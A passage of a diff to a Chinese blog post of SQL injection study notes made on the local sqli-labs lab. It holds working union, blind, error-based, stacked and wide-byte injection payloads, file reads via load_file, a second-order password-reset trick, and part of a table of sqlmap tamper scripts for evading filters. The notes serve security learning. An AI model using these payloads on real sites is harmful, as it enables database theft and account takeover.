@@ -86,13 +86,16 @@
 
 
 
-<meta name="description" content="学习目标：能看懂大部分的sql语句，做到给一个复杂的sql语句能看懂，知道是干什么用的，为什么这么写. 第一部分：基础1、注入的分类：基于从服务器接收到的响应▲基于错误的 SQL 注入▲联合查询的类型▲堆查询注射▲SQL 盲注•基于布尔 SQL 盲注•基于时间的 SQL 盲注•基于报错的 SQL 盲注 基于如何处理输入的 SQL 查询（数据类型）•基于字符串•数字或整数为基础的 基于程度和顺序的注">
+<meta name="description" content="学习目标：能看懂大部分的sql语句，做到给一个复杂的sql语句能看懂，知道是干什么用的，为什么这么写. 第一部分：获取payload通过sqlmap awvs等工具更新sqlmap  ​        内容太多，先放弃了 用着再查 通过谷歌 第二部分：基础1、注入的分类：基于从服务器接收到的响应▲基于错误的 SQL 注入 在URL加入了一些错误的SQL语句，被执行后返回了异常信息，这些异常信息当中">
 <meta property="og:type" content="article">
 <meta property="og:title" content="sql注入的payload">
 <meta property="og:url" content="http://yoursite.com/2019/09/01/sql注入的payload/index.html">
 <meta property="og:site_name" content="ZSC0810の博客">
-<meta property="og:description" content="学习目标：能看懂大部分的sql语句，做到给一个复杂的sql语句能看懂，知道是干什么用的，为什么这么写. 第一部分：基础1、注入的分类：基于从服务器接收到的响应▲基于错误的 SQL 注入▲联合查询的类型▲堆查询注射▲SQL 盲注•基于布尔 SQL 盲注•基于时间的 SQL 盲注•基于报错的 SQL 盲注 基于如何处理输入的 SQL 查询（数据类型）•基于字符串•数字或整数为基础的 基于程度和顺序的注">
+<meta property="og:description" content="学习目标：能看懂大部分的sql语句，做到给一个复杂的sql语句能看懂，知道是干什么用的，为什么这么写. 第一部分：获取payload通过sqlmap awvs等工具更新sqlmap  ​        内容太多，先放弃了 用着再查 通过谷歌 第二部分：基础1、注入的分类：基于从服务器接收到的响应▲基于错误的 SQL 注入 在URL加入了一些错误的SQL语句，被执行后返回了异常信息，这些异常信息当中">
 <meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://yoursite.com/2019/%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/Blog/source/_posts/sql%E6%B3%A8%E5%85%A5%E7%9A%84payload/1568646753227.png">
+<meta property="og:image" content="http://yoursite.com/2019/%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/Blog/source/_posts/sql%E6%B3%A8%E5%85%A5%E7%9A%84payload/1568646804643.png">
+<meta property="og:image" content="http://yoursite.com/2019/%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/Blog/source/_posts/sql%E6%B3%A8%E5%85%A5%E7%9A%84payload/1568724340555.png">
 <meta property="og:image" content="http://yoursite.com/2019/09/01/sql注入的payload/1568033164895.png">
 <meta property="og:image" content="http://yoursite.com/2019/09/01/sql注入的payload/1568033694917.png">
 <meta property="og:image" content="http://yoursite.com/2019/09/01/sql注入的payload/1568034279294.png">
@@ -121,11 +124,17 @@
 <meta property="og:image" content="http://yoursite.com/2019/09/01/sql注入的payload/1568380310301.png">
 <meta property="og:image" content="http://yoursite.com/2019/09/01/sql注入的payload/1568381361835.png">
 <meta property="og:image" content="http://yoursite.com/2019/09/01/sql注入的payload/1568511339271.png">
-<meta property="og:updated_time" content="2019-09-15T01:38:55.318Z">
+<meta property="og:image" content="http://yoursite.com/2019/09/01/sql注入的payload/1568511622118.png">
+<meta property="og:image" content="http://yoursite.com/2019/09/01/sql注入的payload/1568643164094.png">
+<meta property="og:image" content="http://yoursite.com/2019/09/01/sql注入的payload/1568725746852.png">
+<meta property="og:image" content="http://yoursite.com/2019/09/01/sql注入的payload/1568725721982.png">
+<meta property="og:image" content="http://yoursite.com/2019/09/01/sql注入的payload/1568726544006.png">
+<meta property="og:image" content="http://yoursite.com/2019/09/01/sql注入的payload/1568728152475.png">
+<meta property="og:updated_time" content="2019-09-17T13:57:06.454Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="sql注入的payload">
-<meta name="twitter:description" content="学习目标：能看懂大部分的sql语句，做到给一个复杂的sql语句能看懂，知道是干什么用的，为什么这么写. 第一部分：基础1、注入的分类：基于从服务器接收到的响应▲基于错误的 SQL 注入▲联合查询的类型▲堆查询注射▲SQL 盲注•基于布尔 SQL 盲注•基于时间的 SQL 盲注•基于报错的 SQL 盲注 基于如何处理输入的 SQL 查询（数据类型）•基于字符串•数字或整数为基础的 基于程度和顺序的注">
-<meta name="twitter:image" content="http://yoursite.com/2019/09/01/sql注入的payload/1568033164895.png">
+<meta name="twitter:description" content="学习目标：能看懂大部分的sql语句，做到给一个复杂的sql语句能看懂，知道是干什么用的，为什么这么写. 第一部分：获取payload通过sqlmap awvs等工具更新sqlmap  ​        内容太多，先放弃了 用着再查 通过谷歌 第二部分：基础1、注入的分类：基于从服务器接收到的响应▲基于错误的 SQL 注入 在URL加入了一些错误的SQL语句，被执行后返回了异常信息，这些异常信息当中">
+<meta name="twitter:image" content="http://yoursite.com/2019/%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/Blog/source/_posts/sql%E6%B3%A8%E5%85%A5%E7%9A%84payload/1568646753227.png">
 
 
 
@@ -375,8 +384,8 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2019-09-15T09:38:55+08:00">
-                2019-09-15
+              <time title="更新于" itemprop="dateModified" datetime="2019-09-17T21:57:06+08:00">
+                2019-09-17
               </time>
             
           </span>
@@ -408,7 +417,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  4.1k
+                  5.7k
                 </span>
               
 
@@ -424,7 +433,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  17
+                  23
                 </span>
               
             </div>
@@ -446,10 +455,17 @@
 
       
         <p>学习目标：能看懂大部分的sql语句，做到给一个复杂的sql语句能看懂，知道是干什么用的，为什么这么写.</p>
-<h1 id="第一部分：基础"><a href="#第一部分：基础" class="headerlink" title="第一部分：基础"></a>第一部分：基础</h1><h2 id="1、注入的分类："><a href="#1、注入的分类：" class="headerlink" title="1、注入的分类："></a>1、注入的分类：</h2><h3 id="基于从服务器接收到的响应"><a href="#基于从服务器接收到的响应" class="headerlink" title="基于从服务器接收到的响应"></a>基于从服务器接收到的响应</h3><p>▲基于错误的 SQL 注入<br>▲联合查询的类型<br>▲堆查询注射<br>▲SQL 盲注<br>•基于布尔 SQL 盲注<br>•基于时间的 SQL 盲注<br>•基于报错的 SQL 盲注</p>
-<h3 id="基于如何处理输入的-SQL-查询（数据类型）"><a href="#基于如何处理输入的-SQL-查询（数据类型）" class="headerlink" title="基于如何处理输入的 SQL 查询（数据类型）"></a>基于如何处理输入的 SQL 查询（数据类型）</h3><p>•基于字符串<br>•数字或整数为基础的</p>
-<h3 id="基于程度和顺序的注入-哪里发生了影响"><a href="#基于程度和顺序的注入-哪里发生了影响" class="headerlink" title="基于程度和顺序的注入(哪里发生了影响)"></a>基于程度和顺序的注入(哪里发生了影响)</h3><p>★一阶注射<br>★二阶注射<br>一阶注射是指输入的注射语句对 WEB 直接产生了影响， 出现了结果； 二阶注入类似存<br>储型 XSS， 是指输入提交的语句， 无法直接对 WEB 应用程序产生影响， 通过其它的辅助间<br>接的对 WEB 产生危害， 这样的就被称为是二阶注入.</p>
-<h3 id="基于注入点的位置上的"><a href="#基于注入点的位置上的" class="headerlink" title="基于注入点的位置上的"></a>基于注入点的位置上的</h3><p>▲通过用户输入的表单域的注射。<br>▲通过 cookie 注射。<br>▲通过服务器变量注射。 （基于头部信息的注射） </p>
+<h1 id="第一部分：获取payload"><a href="#第一部分：获取payload" class="headerlink" title="第一部分：获取payload"></a>第一部分：获取payload</h1><h2 id="通过sqlmap-awvs等工具"><a href="#通过sqlmap-awvs等工具" class="headerlink" title="通过sqlmap awvs等工具"></a>通过sqlmap awvs等工具</h2><p>更新sqlmap</p>
+<p><img src="/2019/09/01/sql注入的payload/../../../%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/Blog/source/_posts/sql%E6%B3%A8%E5%85%A5%E7%9A%84payload/1568646753227.png" alt="1568646753227"></p>
+<p>​       <img src="/2019/09/01/sql注入的payload/../../../%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/Blog/source/_posts/sql%E6%B3%A8%E5%85%A5%E7%9A%84payload/1568646804643.png" alt="1568646804643"></p>
+<p>内容太多，先放弃了 用着再查</p>
+<h2 id="通过谷歌"><a href="#通过谷歌" class="headerlink" title="通过谷歌"></a>通过谷歌</h2><p><img src="/2019/09/01/sql注入的payload/../../../%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/Blog/source/_posts/sql%E6%B3%A8%E5%85%A5%E7%9A%84payload/1568724340555.png" alt="1568724340555"></p>
+<h1 id="第二部分：基础"><a href="#第二部分：基础" class="headerlink" title="第二部分：基础"></a>第二部分：基础</h1><h2 id="1、注入的分类："><a href="#1、注入的分类：" class="headerlink" title="1、注入的分类："></a>1、注入的分类：</h2><h3 id="基于从服务器接收到的响应"><a href="#基于从服务器接收到的响应" class="headerlink" title="基于从服务器接收到的响应"></a>基于从服务器接收到的响应</h3><h4 id="▲基于错误的-SQL-注入"><a href="#▲基于错误的-SQL-注入" class="headerlink" title="▲基于错误的 SQL 注入"></a>▲基于错误的 SQL 注入</h4><p> 在URL加入了一些错误的SQL语句，被执行后返回了异常信息，这些异常信息当中包含了敏感信息 </p>
+<h4 id="▲联合查询的类型"><a href="#▲联合查询的类型" class="headerlink" title="▲联合查询的类型"></a>▲联合查询的类型</h4><h4 id="▲堆查询注入"><a href="#▲堆查询注入" class="headerlink" title="▲堆查询注入"></a>▲堆查询注入</h4><p> 回显注入：利用注入漏洞可以改变页面返回数据 </p>
+<h4 id="▲SQL-盲注"><a href="#▲SQL-盲注" class="headerlink" title="▲SQL 盲注"></a>▲SQL 盲注</h4><h5 id="•基于布尔-SQL-盲注"><a href="#•基于布尔-SQL-盲注" class="headerlink" title="•基于布尔 SQL 盲注"></a>•基于布尔 SQL 盲注</h5><p> 通过条件是否成立来判断substr截取第一个字符判断是否大于’a’，成立则页面返回数据</p>
+<h5 id="•基于时间的-SQL-盲注"><a href="#•基于时间的-SQL-盲注" class="headerlink" title="•基于时间的 SQL 盲注"></a>•基于时间的 SQL 盲注</h5><p>通过返回时间的长短判断<br> 获取第一个字符的ascii码，判断是否大于115，不成立延时5秒返回 </p>
+<h5 id="•基于报错的-SQL-盲注"><a href="#•基于报错的-SQL-盲注" class="headerlink" title="•基于报错的 SQL 盲注"></a>•基于报错的 SQL 盲注</h5><h3 id="基于如何处理输入的-SQL-查询（数据类型）"><a href="#基于如何处理输入的-SQL-查询（数据类型）" class="headerlink" title="基于如何处理输入的 SQL 查询（数据类型）"></a>基于如何处理输入的 SQL 查询（数据类型）</h3><h5 id="•基于字符串"><a href="#•基于字符串" class="headerlink" title="•基于字符串"></a>•基于字符串</h5><h5 id="•数字或整数为基础的"><a href="#•数字或整数为基础的" class="headerlink" title="•数字或整数为基础的"></a>•数字或整数为基础的</h5><h3 id="基于程度和顺序的注入-哪里发生了影响"><a href="#基于程度和顺序的注入-哪里发生了影响" class="headerlink" title="基于程度和顺序的注入(哪里发生了影响)"></a>基于程度和顺序的注入(哪里发生了影响)</h3><h5 id="★一阶注射"><a href="#★一阶注射" class="headerlink" title="★一阶注射"></a>★一阶注射</h5><p>★二阶注射<br>一阶注射是指输入的注射语句对 WEB 直接产生了影响， 出现了结果； 二阶注入类似存<br>储型 XSS， 是指输入提交的语句， 无法直接对 WEB 应用程序产生影响， 通过其它的辅助间<br>接的对 WEB 产生危害， 这样的就被称为是二阶注入.</p>
+<h3 id="基于注入点的位置上的"><a href="#基于注入点的位置上的" class="headerlink" title="基于注入点的位置上的"></a>基于注入点的位置上的</h3><h5 id="▲通过用户输入的表单域的注射。"><a href="#▲通过用户输入的表单域的注射。" class="headerlink" title="▲通过用户输入的表单域的注射。"></a>▲通过用户输入的表单域的注射。</h5><p>▲通过 cookie 注射。<br>▲通过服务器变量注射。 （基于头部信息的注射） </p>
 <p>以上就是通常分类，先记录下，通过后面的实验练习加深理解</p>
 <h2 id="2、系统函数"><a href="#2、系统函数" class="headerlink" title="2、系统函数"></a>2、系统函数</h2><p>介绍几个常用函数：</p>
 <ol>
@@ -497,13 +513,13 @@
 <p>获取某列的内容 </p>
 <p>select * from 表名；</p>
 <p><img src="/2019/09/01/sql注入的payload/1568034716824.png" alt="1568034716824"></p>
-<h1 id="1-联合查询的类型"><a href="#1-联合查询的类型" class="headerlink" title="1 联合查询的类型"></a>1 联合查询的类型</h1><p><img src="/2019/09/01/sql注入的payload/1568038433600.png" alt="1568038433600"></p>
+<h1 id="第部分：实验演示"><a href="#第部分：实验演示" class="headerlink" title="第部分：实验演示"></a>第部分：实验演示</h1><h2 id="联合查询的类型"><a href="#联合查询的类型" class="headerlink" title="联合查询的类型"></a>联合查询的类型</h2><p><img src="/2019/09/01/sql注入的payload/1568038433600.png" alt="1568038433600"></p>
 <p>payload：-1’union select 1,group_concat(schema_name),3 from information_schema.schemata –+</p>
 <p>1、group_concat(str1,str2,…)——连接一个组的所有字符串， 并以逗号分隔每一条数据</p>
 <p>2、union 联合注入， union 的作用是将两个 sql 语句进行联合， union 前后的两个 sql 语句的选择列数要相同才可以。 U<br>nion all 与 union 的区别是增加了去重的功能 </p>
 <p>3、当 id 的数据在数据库中不存在时， id=-1， 两个 sql 语句进行联合操作时，当前一个语句选择的内容为空，就将后面的语句的内容显示出来，此处前台页面返回了我们构造的 union 的数据 </p>
 <p>4、此处利用 order by 对前面的数据进行排序， 这里有三列数据， 我们就只能用order by 3,超过 3 就会报错。‘order by 4–+的结果显示结果超出。 </p>
-<h1 id="2-盲注"><a href="#2-盲注" class="headerlink" title="2 盲注"></a>2 盲注</h1><p>盲注：sql 注入过程中， sql 语句执行的选择后， 选择的数据不能回显，不返回数据库当中的信息<br>到前端页面。 </p>
+<h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><p>盲注：sql 注入过程中， sql 语句执行的选择后， 选择的数据不能回显，不返回数据库当中的信息<br>到前端页面。 </p>
 <p>盲注可以分为三类：</p>
 <p>•基于布尔 SQL 盲注<br>•基于时间的 SQL 盲注<br>•基于报错的 SQL 盲注 </p>
 <h3 id="1：-基于布尔-SQL-盲注-构造逻辑判断"><a href="#1：-基于布尔-SQL-盲注-构造逻辑判断" class="headerlink" title="1： 基于布尔 SQL 盲注-构造逻辑判断"></a>1： 基于布尔 SQL 盲注-构造逻辑判断</h3><p>  <a href="https://www.cnblogs.com/lcamry/p/5504374.html" target="_blank" rel="noopener">截取字符串相关函数解析</a></p>
@@ -518,7 +534,8 @@
 <p>▲like 匹配注入 </p>
 <p>和上述的正则类似， mysql 在匹配的时候我们可以用 ike 进行匹配。<br>用法： select user() like ‘ro% </p>
 <p><img src="/2019/09/01/sql注入的payload/1568039869657.png" alt="1568039869657"></p>
-<h3 id="2：-基于报错的-SQL-盲注-构造-payload-让信息通过错误提示回显出来-存疑"><a href="#2：-基于报错的-SQL-盲注-构造-payload-让信息通过错误提示回显出来-存疑" class="headerlink" title="2： 基于报错的 SQL 盲注-构造 payload 让信息通过错误提示回显出来  存疑"></a>2： 基于报错的 SQL 盲注-构造 payload 让信息通过错误提示回显出来  存疑</h3><h3 id="3-基于时间的-SQL-盲注–延时注入"><a href="#3-基于时间的-SQL-盲注–延时注入" class="headerlink" title="3:基于时间的 SQL 盲注–延时注入"></a>3:基于时间的 SQL 盲注–延时注入</h3><p>▲If(ascii(substr(database(),1,1))&gt;115,0,sleep(5))%23 //if 判断语句， 条件为假，<br>执行 sleep</p>
+<h3 id="2：-基于报错的-SQL-盲注-构造-payload-让信息通过错误提示回显出来-存疑"><a href="#2：-基于报错的-SQL-盲注-构造-payload-让信息通过错误提示回显出来-存疑" class="headerlink" title="2： 基于报错的 SQL 盲注-构造 payload 让信息通过错误提示回显出来  存疑"></a>2： 基于报错的 SQL 盲注-构造 payload 让信息通过错误提示回显出来  存疑</h3><p>▲extractvalue(1,concat(0x7e,(select @@version),0x7e)) se//mysql 对 xml 数据进<br>行查询和修改的 xpath 函数， xpath 语法错误<br>▲updatexml(1,concat(0x7e,(select @@version),0x7e),1) //mysql 对 xml 数据进行<br>查询和修改的 xpath 函数， xpath 语法错误<br>▲select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;<br>//mysql 重复特性， 此处重复了 version， 所以报错。 </p>
+<h3 id="3-基于时间的-SQL-盲注–延时注入"><a href="#3-基于时间的-SQL-盲注–延时注入" class="headerlink" title="3:基于时间的 SQL 盲注–延时注入"></a>3:基于时间的 SQL 盲注–延时注入</h3><p>▲If(ascii(substr(database(),1,1))&gt;115,0,sleep(5))%23 //if 判断语句， 条件为假，<br>执行 sleep</p>
 <p>IF表达式</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IF(expr1,expr2,expr3)</span><br></pre></td></tr></table></figure>
 
@@ -556,7 +573,7 @@
 <p>猜测users表的列</p>
 <p><a href="http://127.0.0.1/sqllib/Less-9/?id=1&#39;and" target="_blank" rel="noopener">http://127.0.0.1/sqllib/Less-9/?id=1&#39;and</a> If(ascii(substr((select column_name from information<br>schema.columns where table_name=’users’ limit 0,1),1,1))=105,1,sleep(5))–+<br>猜测 users 表的第一个列的第一个字符是 i，<br>以此类推， 我们得到列名是 id， username， password </p>
 <p>猜测 username 的值：<br><a href="http://127.0.0.1/sqllib/Less-9/?id=1&#39;and" target="_blank" rel="noopener">http://127.0.0.1/sqllib/Less-9/?id=1&#39;and</a> If(ascii(substr((select username from users limit 0,1),<br>1,1))=68,1,sleep(5))–+<br>猜测 username 的第一行的第一位<br>以此类推， 我们得到数据库 username， password 的所有内容 </p>
-<h2 id="3-文件的导入导出"><a href="#3-文件的导入导出" class="headerlink" title="3 文件的导入导出"></a>3 文件的导入导出</h2><h4 id="1、-load-file-导出文件"><a href="#1、-load-file-导出文件" class="headerlink" title="1、 load_file()导出文件"></a>1、 load_file()导出文件</h4><p>Load_file(file_name):读取文件并返回该文件的内容作为一个字符串。<br>使用条件：<br>A、 必须有权限读取并且文件必须完全可读<br>and (select count(<em>) from mysql.user)&gt;0/</em> 如果结果返回正常,说明具有读写权限。<br>and (select count(<em>) from mysql.user)&gt;0/</em> 返回错误， 应该是管理员给数据库帐户降权<br>B、 欲读取文件必须在服务器上<br>C、 必须指定文件完整的路径<br>Mysql 注入—sqlilabs—lcamry<br>30<br>D、 欲读取文件必须小于 max_allowed_packet<br>如果该文件不存在， 或因为上面的任一原因而不能被读出， 函数返回空。 比较难满足的<br>就是权限， 在 windows 下， 如果 NTFS 设置得当， 是不能读取相关的文件的， 当遇到只有<br>administrators 才能访问的文件， users 就别想 load_file 出来。<br>在实际的注入中， 我们有两个难点需要解决：<br>绝对物理路径<br>构造有效的畸形语句 （报错爆出绝对路径）<br>在很多 PHP 程序中， 当提交一个错误的 Query， 如果 display_errors = on， 程序就会暴露<br>WEB 目录的绝对路径， 只要知道路径， 那么对于一个可以注入的 PHP 程序来说， 整个服务<br>器的安全将受到严重的威胁。<br>常用路径：<br><a href="http://www.cnblogs.com/lcamry/p/5729087.html" target="_blank" rel="noopener">http://www.cnblogs.com/lcamry/p/5729087.html</a><br>示例： Select 1,2,3,4,5,6,7,hex(replace(load_file(char(99,58,92,119,105,110,100,111,119,115,92,<br>114,101,112,97,105,114,92,115,97,109)))<br>利用 hex()将文件内容导出来， 尤其是 smb 文件时可以使用。<br>-1 union select 1,1,1,load_file(char(99,58,47,98,111,111,116,46,105,110,105))<br>Explain： “char(99,58,47,98,111,111,116,46,105,110,105)” 就是“c:/boot.ini” 的 ASCII 代码<br>-1 union select 1,1,1,load_file(0x633a2f626f6f742e696e69)<br>Explain： “c:/boot.ini” 的 16 进制是“0x633a2f626f6f742e696e69”<br>-1 union select 1,1,1,load_file(c:\boot.ini)<br>Explain:路径里的/用 \代替 </p>
+<h2 id="文件的导入导出"><a href="#文件的导入导出" class="headerlink" title="文件的导入导出"></a>文件的导入导出</h2><h4 id="1、-load-file-导出文件"><a href="#1、-load-file-导出文件" class="headerlink" title="1、 load_file()导出文件"></a>1、 load_file()导出文件</h4><p>Load_file(file_name):读取文件并返回该文件的内容作为一个字符串。<br>使用条件：<br>A、 必须有权限读取并且文件必须完全可读<br>and (select count(<em>) from mysql.user)&gt;0/</em> 如果结果返回正常,说明具有读写权限。<br>and (select count(<em>) from mysql.user)&gt;0/</em> 返回错误， 应该是管理员给数据库帐户降权<br>B、 欲读取文件必须在服务器上<br>C、 必须指定文件完整的路径<br>Mysql 注入—sqlilabs—lcamry<br>30<br>D、 欲读取文件必须小于 max_allowed_packet<br>如果该文件不存在， 或因为上面的任一原因而不能被读出， 函数返回空。 比较难满足的<br>就是权限， 在 windows 下， 如果 NTFS 设置得当， 是不能读取相关的文件的， 当遇到只有<br>administrators 才能访问的文件， users 就别想 load_file 出来。<br>在实际的注入中， 我们有两个难点需要解决：<br>绝对物理路径<br>构造有效的畸形语句 （报错爆出绝对路径）<br>在很多 PHP 程序中， 当提交一个错误的 Query， 如果 display_errors = on， 程序就会暴露<br>WEB 目录的绝对路径， 只要知道路径， 那么对于一个可以注入的 PHP 程序来说， 整个服务<br>器的安全将受到严重的威胁。<br>常用路径：<br><a href="http://www.cnblogs.com/lcamry/p/5729087.html" target="_blank" rel="noopener">http://www.cnblogs.com/lcamry/p/5729087.html</a><br>示例： Select 1,2,3,4,5,6,7,hex(replace(load_file(char(99,58,92,119,105,110,100,111,119,115,92,<br>114,101,112,97,105,114,92,115,97,109)))<br>利用 hex()将文件内容导出来， 尤其是 smb 文件时可以使用。<br>-1 union select 1,1,1,load_file(char(99,58,47,98,111,111,116,46,105,110,105))<br>Explain： “char(99,58,47,98,111,111,116,46,105,110,105)” 就是“c:/boot.ini” 的 ASCII 代码<br>-1 union select 1,1,1,load_file(0x633a2f626f6f742e696e69)<br>Explain： “c:/boot.ini” 的 16 进制是“0x633a2f626f6f742e696e69”<br>-1 union select 1,1,1,load_file(c:\boot.ini)<br>Explain:路径里的/用 \代替 </p>
 <h4 id="2、-文件导入到数据库"><a href="#2、-文件导入到数据库" class="headerlink" title="2、 文件导入到数据库"></a>2、 文件导入到数据库</h4><p>LOAD DATA INFILE 语句用于高速地从一个文本文件中读取行， 并装入一个表中。 文件名称必<br>须为一个文字字符串。 </p>
 <p>在注入过程中， 我们往往需要一些特殊的文件， 比如配置文件， 密码文件等。 当你具有数据<br>库的权限时， 可以将系统文件利用 load data infile 导入到数据库中。 </p>
 <p>示例： load data infile ‘/tmp/t0.txt’ ignore into table t0 character set gbk fields terminated by ‘\t’<br>lines terminated by ‘\n’ </p>
@@ -610,7 +627,7 @@
 <p><img src="/2019/09/01/sql注入的payload/1568381361835.png" alt="1568381361835"></p>
 <p>payload:</p>
 <p>‘and extractvalue(1,concat(0x7e,(select @@basedir),0x7e)) and ‘1’=’1 </p>
-<h1 id="第二部分：高级注入"><a href="#第二部分：高级注入" class="headerlink" title="第二部分：高级注入"></a>第二部分：高级注入</h1><h3 id="二次排序"><a href="#二次排序" class="headerlink" title="二次排序"></a>二次排序</h3><p>什么是二次排序：二次排序注入也成为存储型的注入， 就是将可能导致sql 注入的字符先存入到数据库中， 当再次调用这个恶意构造的字符时， 就可以出触发sql 注入。 </p>
+<h2 id="二次排序"><a href="#二次排序" class="headerlink" title="二次排序"></a>二次排序</h2><p>什么是二次排序：二次排序注入也成为存储型的注入， 就是将可能导致sql 注入的字符先存入到数据库中， 当再次调用这个恶意构造的字符时， 就可以出触发sql 注入。 </p>
 <p>二次排序注入思路：</p>
 <ol>
 <li>黑客通过构造数据的形式， 在浏览器或者其他软件中提交 HTTP 数据报文请求到服务<br>端进行处理， 提交的数据报文请求中可能包含了黑客构造的 SQL 语句或者命令。</li>
@@ -621,6 +638,444 @@
 </ol>
 <p>注册用户名为admin’# 密码为123的账号</p>
 <p><img src="/2019/09/01/sql注入的payload/1568511339271.png" alt="1568511339271"></p>
+<p>登录用户名 admi’# 并修改密码</p>
+<p><img src="/2019/09/01/sql注入的payload/1568511622118.png" alt="1568511622118"></p>
+<p>可以看到admin 密码被修改了</p>
+<p>Sql 语句变为 UPDATE users SET passwd=”New_Pass” WHERE username =’ admin’ # ‘ AND<br>password=’ ， 也 就 是 执 行 了 UPDATE users SET passwd=”New_Pass” WHERE username =’<br>admin’</p>
+<p>利用注册的admin’# 修改密码时候从数据库提取该数据 造成了数据 命令拼接 </p>
+<h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>mysql 在使用 GBK 编码的时候， 会认为两个字符为一个汉字， 例如%aa%5c 就是一个<br>汉字（前一个 ascii 码大于 128 才能到汉字的范围） 。 我们在过滤 ’ 的时候， 往往利用的思<br>路是将 ‘ 转换为 \’ </p>
+<p>1、 %df 吃掉 \ 具体的原因是 urlencode(‘) = %5c%27， 我们在%5c%27 前面添加%df， 形<br>成%df%5c%27， 而上面提到的 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字， 此<br>事%df%5c 就是一个汉字， %27 则作为一个单独的符号在外面， 同时也就达到了我们的目的。<br>2、 将 \’ 中的 \ 过滤掉， 例如可以构造 %**%5c%5c%27 的情况， 后面的%5c 会被前面的%5c<br>给注释掉。 这也是 bypass 的一种方法。 </p>
+<p>get 型的方式我们是以 url 形式提交的， 因此数据会通过 URLencode</p>
+<p> post 型的注入当中， 将 utf-8 转换为 utf-16 或 utf-32， 例如将 ‘ 转为 utf-16 为 � ‘ </p>
+<h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><p>1、在 SQL 中， 分号（;） 是用来表示一条 sql 语句的结束。</p>
+<p>2、在 ; 结束一个 sql语句后继续构造下一条语句就造就了堆叠注入。</p>
+<p>3、与union injection（联合注入）的 区别就在于 union或者 union all 执行的语句类型是有限的， 可以用来执行查询语句， 而堆叠</p>
+<p>注入可以执行的是任意的语句 </p>
+<p><img src="/2019/09/01/sql注入的payload/1568643164094.png" alt="1568643164094"></p>
+<p> 堆叠注入的局限性在于并不是每一个环境下都可以执行， 可能受到 API 或者数据库引擎不支持的限制，在我们的 web 系统中， 因为代码通常只返回一个查询结果， 因此， 堆叠注入第二个语句产生错误或者结果只能被忽略， 我们在前端界面是无法看到返回结果的。因此， 在读取数据时，建议使用 union（联合） 注入。 同时在使用堆叠注入之前，我们也是需要知道一些数据库相关信息的， 例如表名， 列名等信息 </p>
+<p>PS：oracle 不能使用堆叠注入， 当有两条语句在同一行时， 直接报错。 无效字符。</p>
+<p>堆叠注入payload：</p>
+<p><a href="http://127.0.0.1/sqli-labs/Less-38/index.php" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs/Less-38/index.php</a><br>?id=1%27;insert into users(id,username,password) values (‘39’,’less39’,’hello’)–+</p>
+<h2 id="Tamper详解"><a href="#Tamper详解" class="headerlink" title="Tamper详解"></a>Tamper详解</h2><p>原始注入遇到困难时，可尝试加载相应脚本，进行绕过用法： –tamper**“脚本名称”(可使用多个tamper)</p>
+<p>sqlmap版本1.2.7.20，共有57个tamper脚本</p>
+<table>
+<thead>
+<tr>
+<th><strong>序号</strong></th>
+<th align="left"><strong>脚本名称</strong></th>
+<th><strong>注释</strong></th>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td align="left">0x2char</td>
+<td>将每个编码后的字符转换为等价表达</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>2</td>
+<td align="left">apostrophemask</td>
+<td>单引号替换为Utf8字符，用于过滤单引号</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>3</td>
+<td align="left">apostrophenullencode</td>
+<td>替换双引号为%00%27</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>4</td>
+<td align="left">appendnullbyte</td>
+<td>有效代码后添加%00</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>5</td>
+<td align="left">base64encode</td>
+<td>使用base64编码</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>6</td>
+<td align="left">between</td>
+<td>比较符替换为between</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>7</td>
+<td align="left">bluecoat</td>
+<td>空格替换为随机空白字符，等号替换为like</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>8</td>
+<td align="left">chardoubleencode</td>
+<td>双url编码</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>9</td>
+<td align="left">charencode</td>
+<td>将url编码(不处理已经编码的字符)</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>10</td>
+<td align="left">charunicodeencode</td>
+<td>使用unicode编码</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>11</td>
+<td align="left">charunicodeescape</td>
+<td>以指定的payload反向编码未编码的字符</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>12</td>
+<td align="left">commalesslimit</td>
+<td>改变limit语句的写法</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>13</td>
+<td align="left">commalessmid</td>
+<td>改变mid语句的写法</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>14</td>
+<td align="left">commentbeforeparentheses</td>
+<td>在括号前加内联注释</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>15</td>
+<td align="left">concat2concatws</td>
+<td>替换CONCAT为CONCAT_WS</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>16</td>
+<td align="left">equaltolike</td>
+<td>等号替换为like</td>
+<td></td>
